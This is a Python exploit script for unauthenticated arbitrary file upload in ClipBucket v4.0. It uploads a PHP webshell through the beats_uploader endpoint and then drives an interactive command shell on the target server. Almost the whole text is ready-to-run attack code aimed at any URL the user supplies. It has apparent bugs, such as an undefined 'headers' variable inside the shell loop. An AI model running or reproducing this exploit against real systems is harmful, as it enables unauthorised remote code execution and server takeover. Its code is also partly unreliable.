# ClipBucket v4.0 - Unauthenticated arbitrary file upload to RCE
# Coded by - Nehal Zaman (@pwnersec)

from requests_toolbelt import MultipartEncoder
from termcolor import colored
from banner import banner
import argparse
import string
import random
import requests
import json

PAYLOAD_TEMPLATE = "payloads/"
TEMP_DIRECTORY = "temp/"
ENDPOINT = "/actions/beats_uploader.php"
PROXY = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

def parse_url(url):
	if url.startswith("http://") or url.startswith("https://"):
		return url
	else:
		return f"http://{url}"

def make_payload():
	name = "".join(random.choice(string.ascii_letters) for _ in range(10))
	with open(f"{PAYLOAD_TEMPLATE}template.php", "r") as rf:
		with open(f"{TEMP_DIRECTORY}{name}.php", "w") as wf:
			contents = rf.read()
			wf.write(contents)
	return f"{name}.php"

def make_http_request(url, filename):
	m = MultipartEncoder(
			fields = {
				"file": (f"{filename}", open(f"{TEMP_DIRECTORY}{filename}", "rb")),
				"plupload": "1",
				"name": "anyname.php"
			}
		)
	headers = {
		"Content-type": f"{m.content_type}"
	}
	print(colored("[*] Sending payload to the target.", "green"))
	return requests.post(f"{url}{ENDPOINT}", headers=headers, data=m)

def interactive_shell(url, endpoint):
	print(colored("[*] Spawning interactive webshell.\n", "green"))
	while True:
		cmd = input(colored("[psec]> ", "blue"))
		params = {
			"cmd": cmd
		}
		if cmd == "":
			print(colored("\nExiting webshell.", "red"))
			break
		res = requests.get(f"{url}{endpoint}", params=params, headers=headers)
		print(res.text)

def exploit(url):
	php_file = make_payload()
	print(colored(f"[*] Created PHP payload: {php_file}", "green"))
	res = json.loads(make_http_request(url, php_file).text)
	if res['success'] == "yes":
		backdoor_endpoint = f"/actions/{res['file_directory']}/{res['file_name']}.{res['extension']}"
		print(colored(f"[*] Successful. Payload uploaded to: {backdoor_endpoint}", "green"))
	interactive_shell(url, backdoor_endpoint)

if __name__ == "__main__":
	
	parser = argparse.ArgumentParser()
	parser.add_argument("-u", "--url", type=str, required=True, help="specify your target.")
	args = parser.parse_args()

	print(colored(banner, "yellow"))

	url = parse_url(args.url)
	print(colored(f"[*] Target URL: {url}", "green"))
	
	exploit(url)